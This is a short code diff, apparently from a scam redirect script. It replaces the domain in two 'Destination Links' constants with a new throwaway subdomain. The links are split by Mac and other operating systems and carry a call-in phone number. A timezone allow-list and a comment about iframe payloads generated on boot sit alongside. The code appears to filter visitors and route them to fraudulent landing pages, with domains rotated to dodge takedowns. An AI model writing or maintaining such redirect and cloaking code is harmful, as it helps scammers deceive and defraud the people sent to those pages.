@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://abiliyp111.on-forge.com/mAuS1WmRi05/index.html?contact=+1-806-410-5296";
-const LINK_OTHERS = "https://abiliyp111.on-forge.com/wAuS1WmRi05/index.html?contact=+1-806-410-5296";
+const LINK_MAC = "https://kitttooo333.on-forge.com/mAuS1WmRi05/index.html?contact=+1-806-410-5296";
+const LINK_OTHERS = "https://kitttooo333.on-forge.com/wAuS1WmRi05/index.html?contact=+1-806-410-5296";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
